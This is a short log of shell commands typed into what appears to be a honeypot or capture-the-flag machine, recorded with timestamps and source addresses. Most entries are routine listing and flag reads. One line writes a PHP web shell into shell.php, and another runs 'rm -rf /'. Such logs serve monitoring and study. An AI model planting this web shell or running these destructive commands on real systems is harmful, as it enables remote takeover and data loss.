2025-04-25 09:38:16,127.0.0.1,,ls
2025-04-25 09:38:21,127.0.0.1,,cat flag.txt
2025-04-25 09:39:33,127.0.0.1,,whoami
2025-04-25 09:39:44,127.0.0.1,,ls
2025-04-25 09:39:46,127.0.0.1,,pwd
2025-04-25 10:11:03,127.0.0.1,username,ls
2025-04-25 10:11:13,127.0.0.1,username,nano
2025-04-25 10:11:24,127.0.0.1,username,nano test.txt
2025-04-25 10:11:32,127.0.0.1,username,echo hello
2025-04-25 10:11:48,127.0.0.1,username,history
2025-04-25 10:12:40,127.0.0.1,username,"echo ""<?php system(\$_GET[\'cmd\']); ?>"" > shell.php"
2025-04-25 10:12:42,127.0.0.1,username,ls
2025-04-25 10:12:46,127.0.0.1,username,cat flag.txt
2025-04-25 10:12:58,127.0.0.1,username,env
2025-04-25 10:04:22,192.168.134.130,,ls
2025-04-25 10:04:28,192.168.134.130,,cat custardA.config
2025-04-25 10:04:31,192.168.134.130,,
2025-04-25 10:04:31,192.168.134.130,,
2025-04-25 10:04:32,192.168.134.130,,pwd
2025-04-25 10:42:26,192.168.134.130,,rm -rf /
2025-04-25 10:55:44,192.168.134.130,,ls
2025-04-25 10:55:50,192.168.134.130,,rm /
2025-04-25 10:57:35,192.168.134.130,,ls
2025-04-25 10:57:38,192.168.134.130,,rm /r
2025-04-25 10:57:46,192.168.134.130,,cat flag.txt
2025-04-25 10:57:49,192.168.134.130,,whoami
2025-04-25 10:59:11,192.168.134.130,,rm
2025-04-25 10:59:13,192.168.134.130,,rm /r
2025-04-25 10:59:17,192.168.134.130,,cat flag.txt
